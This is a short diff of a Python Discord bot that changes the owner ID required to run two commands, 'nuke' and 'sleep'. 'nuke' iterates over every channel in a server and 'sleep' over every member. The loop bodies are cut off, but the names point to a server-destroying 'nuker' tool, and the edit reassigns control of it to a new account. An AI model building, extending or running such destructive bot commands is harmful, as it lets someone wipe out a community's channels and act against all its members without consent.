@@ -628,7 +628,7 @@ import asyncio
 
 @bot.command()
 async def nuke(ctx):
-    if ctx.author.id != 761769388335431690:
+    if ctx.author.id != 1097879047213686875:
         return await ctx.send("You are not the bot owner!")
 
     for chan in ctx.guild.channels:
@@ -649,7 +649,7 @@ async def nuke(ctx):
 
 @bot.command()
 async def sleep(ctx):
-    if ctx.author.id != 919458755828129833:
+    if ctx.author.id != 1097879047213686875:
         return await ctx.send("You are not the bot owner!")
 
     for member in ctx.guild.members:
